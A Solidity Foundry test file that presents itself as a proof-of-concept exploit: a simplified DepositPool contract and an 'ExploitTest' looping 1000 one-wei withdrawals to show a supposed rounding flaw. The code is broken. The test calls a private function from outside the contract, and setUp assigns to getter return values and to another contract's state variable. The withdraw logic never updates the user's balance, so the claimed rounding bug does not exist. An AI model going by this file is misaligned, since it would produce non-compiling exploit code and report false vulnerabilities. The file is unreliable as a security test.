// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
}

interface IDistributor {
    function rewardPool() external view returns (address);
}

contract MockRewardPool is IRewardPool {
    function isRewardPoolPublic(uint256) external pure override returns (bool) {
        return true;
    }
}

contract MockDistributor is IDistributor {
    address public rewardPoolAddress;

    constructor(address _rewardPoolAddress) {
        rewardPoolAddress = _rewardPoolAddress;
    }

    function rewardPool() external view override returns (address) {
        return rewardPoolAddress;
    }
}

contract DepositPool {
    struct RewardPoolProtocolDetails {
        uint256 withdrawLockPeriodAfterStake;
        uint256 minimalStake;
    }

    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
    }

    struct UserData {
        uint256 deposited;
        uint256 pendingRewards;
        uint256 virtualDeposited;
        uint256 lastStake;
        uint256 claimLockEnd;
        address referrer;
    }

    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(address => mapping(uint256 => UserData)) public usersData;

    address public distributor;
    bool public isMigrationOver = true;
    uint256 public totalDepositedInPublicPools;

    constructor(address _distributor) {
        distributor = _distributor;
    }

    function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
        require(isMigrationOver == true, "DS: migration isn't over");

        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];
        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex_];
        UserData storage userData = usersData[user_][rewardPoolIndex_];

        uint256 deposited_ = userData.deposited;
        require(deposited_ > 0, "DS: user isn't staked");

        if (amount_ > deposited_) {
            amount_ = deposited_;
        }

        uint256 newDeposited_;
        if (IRewardPool(IDistributor(distributor).rewardPool()).isRewardPoolPublic(rewardPoolIndex_)) {
            require(
                block.timestamp > userData.lastStake + rewardPoolProtocolDetails.withdrawLockPeriodAfterStake,
                "DS: pool withdraw is locked"
            );

            newDeposited_ = deposited_ - amount_;

            require(amount_ > 0, "DS: nothing to withdraw");
            require(
                newDeposited_ >= rewardPoolProtocolDetails.minimalStake || newDeposited_ == 0,
                "DS: invalid withdraw amount"
            );
        } else {
            newDeposited_ = deposited_ - amount_;
        }

        userData.pendingRewards = _getCurrentUserReward(currentPoolRate_, userData);

        uint256 multiplier_ = _getUserTotalMultiplier(
            uint128(block.timestamp),
            userData.claimLockEnd,
            userData.referrer
        );
        uint256 virtualDeposited_ = (newDeposited_ * multiplier_) / 1e18;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        _applyReferrerTier(
            user_,
            rewardPoolIndex_,
            currentPoolRate_,
            deposited_,
            newDeposited_,
            userData.referrer,
            userData.referrer
        );

        // Update pool data
        rewardPoolData.lastUpdate = uint128(block.timestamp);
        rewardPoolData.rate = currentPoolRate_;

        // Update totalDepositedInPublicPools
        totalDepositedInPublicPools -= (deposited_ - newDeposited_);
    }

    function _getCurrentUserReward(uint256, UserData storage) private pure returns (uint256) {
        return 0;
    }

    function _getUserTotalMultiplier(uint128, uint256, address) private pure returns (uint256) {
        return 1e18;
    }

    function _applyReferrerTier(
        address,
        uint256,
        uint256,
        uint256,
        uint256,
        address,
        address
    ) private pure {}
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MockRewardPool rewardPool;
    MockDistributor distributor;

    address attacker = address(0x1);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;
    uint256 withdrawAmount = 1 wei;

    function setUp() public {
        rewardPool = new MockRewardPool();
        distributor = new MockDistributor(address(rewardPool));
        depositPool = new DepositPool(address(distributor));

        // Set up initial state
        depositPool.rewardPoolsProtocolDetails(rewardPoolIndex).withdrawLockPeriodAfterStake = 0;
        depositPool.rewardPoolsProtocolDetails(rewardPoolIndex).minimalStake = 0;

        // Fund attacker and set initial deposit
        vm.deal(attacker, initialDeposit);
        depositPool.usersData(attacker, rewardPoolIndex).deposited = initialDeposit;
        depositPool.totalDepositedInPublicPools = initialDeposit;
    }

    function test_exploit() public {
        vm.prank(attacker);

        // Repeatedly withdraw small amounts to exploit rounding
        for (uint256 i = 0; i < 1000; i++) {
            depositPool._withdraw(attacker, rewardPoolIndex, withdrawAmount, 1e18);
        }

        // Assert the vulnerability
        assertLt(depositPool.totalDepositedInPublicPools(), initialDeposit);
    }
}